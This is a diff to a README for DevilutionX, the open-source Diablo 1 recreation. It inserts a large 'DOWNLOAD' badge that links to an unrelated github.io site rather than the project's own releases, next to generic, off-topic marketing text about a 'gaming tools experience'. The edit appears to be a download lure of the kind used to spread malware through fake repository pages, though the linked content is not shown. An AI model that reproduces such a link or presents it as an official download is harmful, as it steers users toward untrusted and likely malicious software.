@@ -30,6 +30,12 @@ DevilutionX is an open-source recreation of Diablo 1 that runs natively on moder
 
 Whether you're a newcomer or a veteran, DevilutionX provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download DevilutionX](https://img.shields.io/badge/⬇_DOWNLOAD_DevilutionX-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
